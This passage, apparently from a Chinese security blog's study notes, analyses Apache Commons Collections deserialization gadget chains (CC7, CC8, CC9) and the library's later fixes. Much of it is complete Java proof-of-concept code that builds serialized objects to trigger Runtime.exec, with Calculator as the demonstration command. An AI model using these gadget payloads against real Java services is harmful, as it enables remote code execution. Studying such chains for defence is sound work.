ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object o = (Object)ois.readObject(); }} 这里的 key 理论上是我们构造好的 TiedMapEntry ，value 是我们第二个 HashMap put 进去的 “value” 字符串 后续的调用就跟我们之前分析的一样 JDK221 下跟 p师傅原文的代码不一样，这里是 super.map，原文是 map。但是按原文步骤，remove 之后，绕不过这个判断，也没有调用到 chain 的链，但是还是能 RCE。玄学 CommonsCollections7Basics回顾前面 TiedMapEntry#getValue 的调用方式 回顾 TiedMapEntry 里面的方法，CC5 用的是 TiedMapEntry#toString，里面调用了getValue，CC6 用的是 TiedMapEntry#hashCode，里面调用了getValue CC7 没有继续延用 TiedMapEntry 的方法去调用，而是用了 AbstractMap#equals 直接调用了 LazyMap#get 有几个小 trick yy 的 hashCode 跟 zZ 的 hashCode 相等 Gadget chainHashtable#readObject 的 reconstitutionPut 是我们的入口点 通过 Hashtable#readObject ，我们知道 key 跟 value 的值就是我们之前 put 进去的 hashtable.put(key, value); 第一次调用 Hashtable#reconstitutionPut 的时候，不会进入循环，会给 tab[index] 初始化附值 第二次调用的时候，调用其 key 的 equals，进入其 equals 方法后 e.hash == hash 需要前后 hash 值相等 AbstractMapDecorator#equals调用 map 的 equals AbstractMap#equals 调用 m 的 get， 也就是 LazyMap#get，由此触发 RCE 构造 payload 的时候需要注意最后需要把 lazyMap2 的 yy 键 remove 掉 因为 hashtable.put(lazyMap2, 2); 这里在调用 put 方法的时候，也会调用到 equals 方法，就会增加一个yy键，为了保证其正常的反序列化，就要移除掉 CC7 payload public class CC7 { public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, IOException, NoSuchFieldException { Transformer[] realPoc = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, new Class[0]}), new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{ (&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;)}), new ConstantTransformer(1)}; ChainedTransformer fakeChain = new ChainedTransformer(new Transformer[]{ new ConstantTransformer(&quot;random&quot;)}); Map innerMap1 = new HashMap(); Map innerMap2 = new HashMap(); // Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject Map lazyMap1 = LazyMap.decorate(innerMap1, fakeChain); lazyMap1.put(&quot;yy&quot;, 1); Map lazyMap2 = LazyMap.decorate(innerMap2, fakeChain); lazyMap2.put(&quot;zZ&quot;, 1); // Use the colliding Maps as keys in Hashtable Hashtable hashtable = new Hashtable(); hashtable.put(lazyMap1, 1); hashtable.put(lazyMap2, 2); Field f = ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;); f.setAccessible(true); f.set(fakeChain, realPoc); lazyMap2.remove(&quot;yy&quot;); ByteArrayOutputStream bos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(bos); oos.writeObject(hashtable); oos.close(); System.out.println(bos); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bos.toByteArray())); ois.readObject(); }} 利用链 Payload method chain:java.util.Hashtable.readObjectjava.util.Hashtable.reconstitutionPutorg.apache.commons.collections.map.AbstractMapDecorator.equalsjava.util.AbstractMap.equalsorg.apache.commons.collections.map.LazyMap.getorg.apache.commons.collections.functors.ChainedTransformer.transformorg.apache.commons.collections.functors.InvokerTransformer.transformjava.lang.reflect.Method.invokesun.reflect.DelegatingMethodAccessorImpl.invokesun.reflect.NativeMethodAccessorImpl.invokesun.reflect.NativeMethodAccessorImpl.invoke0java.lang.Runtime.exec Commons Collections VersionCommons Collections 3.2.2 Fix3.2.2 版本使用了黑名单，禁止了 InvokerTransformer 类在序列化和反序列化的使用 private void writeObject(ObjectOutputStream os) throws IOException { FunctorUtils.checkUnsafeSerialization(class$org$apache$commons$collections$functors$InvokerTransformer == null ? (class$org$apache$commons$collections$functors$InvokerTransformer = class$(&quot;org.apache.commons.collections.functors.InvokerTransformer&quot;)) : class$org$apache$commons$collections$functors$InvokerTransformer); os.defaultWriteObject();}private void readObject(ObjectInputStream is) throws ClassNotFoundException, IOException { FunctorUtils.checkUnsafeSerialization(class$org$apache$commons$collections$functors$InvokerTransformer == null ? (class$org$apache$commons$collections$functors$InvokerTransformer = class$(&quot;org.apache.commons.collections.functors.InvokerTransformer&quot;)) : class$org$apache$commons$collections$functors$InvokerTransformer); is.defaultReadObject();} Commons Collections 4.1 Fix4.1 InvokerTransformer 和 InstantiateTransformer 两个类都没有实现 Serializable 接口 org.apache.commons.collections4.functors.InvokerTransformer org.apache.commons.collections4.functors.InstantiateTransformer More Gadget ChainCommonsCollections8分析见这篇文章：https://www.anquanke.com/post/id/190472#h3-4 CommonsCollections8是今年navalorenzo推送到ysoserial上的，8与2，4的区别在于使用了新的readObject触发点TreeBag TreeBag#readObject 调用父类的 doReadObject 调用其 map 的 put 后续就是 CC2 中利用 compare 的思路了 TreeBag.readObject() -&gt; AbstractMapBag.doReadObject() -&gt; TreeMap.put() -&gt; TransformingComparator.compare() -&gt; InvokerTransformer.transform() -&gt; TemplatesImpl.newTransformer() ... templates Gadgets ... -&gt; Runtime.getRuntime().exec() CommonsCollections9结合 ysoserial Pull requests 看一下其他的 gadget @梅子酒师傅的 CommonsCollections9 主要利用的是CommonsCollections:3.2版本新增的 DefaultedMap 来代替 LazyMap RCE demo public class CommandDemo { public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException { ChainedTransformer chainDemo = new ChainedTransformer(new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, new Class[0]}), new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{ (&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;)})}); Map innerMap = new HashMap(); DefaultedMap mapDemo = (DefaultedMap) DefaultedMap.decorate(innerMap, chainDemo); mapDemo.get(&quot;random&quot;); }} 结合一些 CC5 可以构造出来完整的 gadget public class CC9 { public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, IOException, NoSuchFieldException { Transformer[] realPoc = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, new Class[0]}), new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{ (&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;)})}; ChainedTransformer fakeChain = new ChainedTransformer(new Transformer[]{ new ConstantTransformer(&quot;random&quot;)}); Map innerMap = new HashMap(); DefaultedMap mapDemo = (DefaultedMap) DefaultedMap.decorate(innerMap, fakeChain); TiedMapEntry rceDemo = new TiedMapEntry(mapDemo, &quot;random&quot;); BadAttributeValueExpException finaldemo = new BadAttributeValueExpException(&quot;random&quot;); Field valDemo = Class.forName(&quot;javax.management.BadAttributeValueExpException&quot;).getDeclaredField(&quot;val&quot;); valDemo.setAccessible(true); valDemo.set(finaldemo, rceDemo); Field f = ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;); f.setAccessible(true); f.set(fakeChain, realPoc); ByteArrayOutputStream bos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(bos); oos.writeObject(finaldemo); oos.close(); System.out.println(bos); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bos.toByteArray())); ois.readObject(); }} END复现分析完 CC 后的反思和小结 挖掘反序列化利用链 挖掘反序列化利用链，首先需要找一个对象里面反射调用 java.lang.Runtime，触发 RCE 的点叫 m0 然后构造一段命令执行 Level-0 的代码，随后我们继续找对象，寻找对象里面某个方法出发 m0 的方法，叫m1，随后当前类的方法有没有调用 m1 的，可能有 m2, m3, m4 等等，之后再找一个类触发 m1, m2, m3, m4 的方法…然后不断循环，直到找到一个类能满足： 该类能调用 xx 对象的 xx 方法，然后循环调用到最后 RCE 的 Level -0 的方法 该类可以被序列化 如何优雅的弹 Calc 问题来源于经常构造好一个命令执行点之后，在 IDEA 下经常编译器会帮我们触发一些 toString 等操作，导致我们的反序列化利用还没有触发到 readObject，就经常弹 Calc 了 @phithon 师傅Java安全漫谈里给出的答案是这样的 Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)}; Transformer[] transformers = 你构造的 transformers Transformer transformerChain = new ChainedTransformer(fakeTransformers); Field f = ChainedTransformer.class.getDeclaredField(&quot;iTransformers&quot;); f.setAccessible(true); f.set(transformerChain, transformers); // ================== // 生成序列化字符串 ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(expMap); oos.close(); // 本地测试触发 System.out.println(barr); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object o = (Object)ois.readObject(); 关于 ChainedTransformer 执行多条命令 参考链接：https://t.zsxq.com/aufUJEa RCE demo public class CommandDemo { public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException { ChainedTransformer chainDemo = new ChainedTransformer(new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, new Class[0]}), new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{ (&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;)}), new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, new Class[0]}), new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{ (&quot;/Applications/Calendar.app/Contents/MacOS/Calendar&quot;)})}); chainDemo.transform(&quot;random&quot;); }} 小结 通过对 Commons Collections 各个链条的梳理和分析，对 Java 反序列化认识越发深刻 没有找到新的 gadgets ，反倒切换 Java 版本越发娴熟 本篇作为自己的学习笔记，参考了诸多师傅的文章，写的时候也不是一气呵成，如文中有错误请不吝赐教","link":"/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/"}],"tags":[{"name":"PHP","slug":"PHP","link":"/tags/PHP/"},{"name":"Laravel","slug":"Laravel","link":"/tags/Laravel/"},{"name":"反序列化","slug":"反序列化","link":"/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"Misc","slug":"Misc","link":"/tags/Misc/"},{"name":"Java","slug":"Java","link":"/tags/Java/"},{"name":"Shiro","slug":"Shiro","link":"/tags/Shiro/"},{"name":"RCE","slug":"RCE","link":"/tags/RCE/"},{"name":"SQLi","slug":"SQLi","link":"/tags/SQLi/"},{"name":"PHPCMS","slug":"PHPCMS","link":"/tags/PHPCMS/"},{"name":"文件上传","slug":"文件上传","link":"/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"name":"CTF","slug":"CTF","link":"/tags/CTF/"},{"name":"fastjson","slug":"fastjson","link":"/tags/fastjson/"},{"name":"XSS","slug":"XSS","link":"/tags/XSS/"}],"categories":[{"name":"PHP Sec","slug":"PHP-Sec","link":"/categories/PHP-Sec/"},{"name":"Misc","slug":"Misc","link":"/categories/Misc/"},{"name":"Java Sec","slug":"Java-Sec","link":"/categories/Java-Sec/"},{"name":"Web Sec","slug":"Web-Sec","link":"/categories/Web-Sec/"}]}